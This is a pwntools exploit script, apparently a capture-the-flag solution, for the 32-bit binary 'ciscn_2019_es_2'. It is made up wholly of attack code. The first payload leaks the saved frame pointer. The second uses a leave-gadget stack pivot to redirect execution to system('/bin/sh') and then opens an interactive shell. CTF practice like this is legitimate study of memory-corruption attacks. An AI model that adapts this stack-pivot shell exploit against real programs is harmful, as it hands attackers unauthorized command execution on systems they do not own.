from pwn import *

context(os="linux", arch="i386", log_level="debug")
p = process('./ciscn_2019_es_2')
elf = ELF('ciscn_2019_es_2')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

system_plt = elf.plt['system']
leave = ROP(elf).find_gadget(['leave'])[0]

payload1 = b'A' * (0x27) + b'B'
p.send(payload1)  # not sendline
p.recvuntil("B")
# gdb.attach(p)
original_ebp = u32(p.recv(4))
success('original_ebp:' + hex(original_ebp))

# 'dddd' fake_ebp
payload2 = flat('aaaa', system_plt, 'dddd', original_ebp - 0x28, b'/bin/sh\x00')
payload2 = payload2.ljust(0x28, b'p')
payload2 = flat(payload2, original_ebp - 0x38, leave)

p.sendline(payload2)
p.interactive()
